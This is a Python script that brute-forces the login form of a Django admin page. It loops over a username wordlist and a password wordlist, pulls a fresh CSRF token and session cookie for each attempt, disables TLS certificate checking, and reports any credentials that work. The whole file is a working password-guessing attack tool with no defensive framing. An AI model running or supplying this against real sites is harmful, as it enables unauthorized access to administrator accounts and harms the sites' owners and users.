import urllib3
import argparse
from bs4 import BeautifulSoup


# Get arguments

parser = argparse.ArgumentParser()
parser.add_argument("-domain",help="Domain for the django admin login page.",required=True)
parser.add_argument("-scheme",help="http or https scheme.",required=True)
parser.add_argument("-uri",help="uri for the admin login page.",required=True)
parser.add_argument("-userdict",help="dictionnary file for user list.",required=True)
parser.add_argument("-passwdict",help="dictionnary file for password.",required=True)


args = parser.parse_args()

domain = args.domain
scheme = args.scheme
uri = args.uri
userdict = args.userdict
passwords = args.passwdict

admin_url = scheme + '://' + domain + uri


# Disable warnings for certs
urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

# By default it ignores certs
http = urllib3.PoolManager(cert_reqs='CERT_NONE')


# Opening dict files
try:
    USERS = open(userdict,'r')
except:
    print("cannot open users file :",userdict)
    exit(1)

try:
    PASSWORDS = open(passwords,'r')
except:
    print("cannot open password file :",userdict)
    exit(1)



headers={'Connection': 'keep-alive',
            'Content-Type': 'application/x-www-form-urlencoded',
            'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/90.0.4430.212 Safari/537.36',
            'Referer': domain + uri }


def Authenticate(admin_url,username,password):
    r = http.request('GET', admin_url, headers=headers)
    login_page = r.data
    Cookies = r.headers["Set-Cookie"]
    soup = BeautifulSoup(login_page, 'html.parser')

    # Getting the csrf token
    csrfmiddlewaretoken = soup.find('input', {'name': 'csrfmiddlewaretoken'})['value']
    
    # creating the fields and the headers
    headers["Cookie"] = Cookies
    
    # payload for authentication
    payload = "csrfmiddlewaretoken="+csrfmiddlewaretoken+"&"+"username="+username+"&password="+password
    
    postlogin = http.request('POST', admin_url, headers=headers, body=payload)
    data = postlogin.data.decode('utf-8')

    if "CSRF" in data:
        print("CSRF token missing or invalid !")
    if "Please" in data:
        print("Trying username:",username, "password:",password, "FAILED")
    else:
        print("Found a valid account !!! --> username:", username, "pass:",password)


userlist = list(set([(word.strip()) for word in USERS.readlines()]))
passwordlist = list(set([(word.strip()) for word in PASSWORDS.readlines()]))



for user in userlist:
    for password in passwordlist:
        Authenticate(admin_url,user,password)


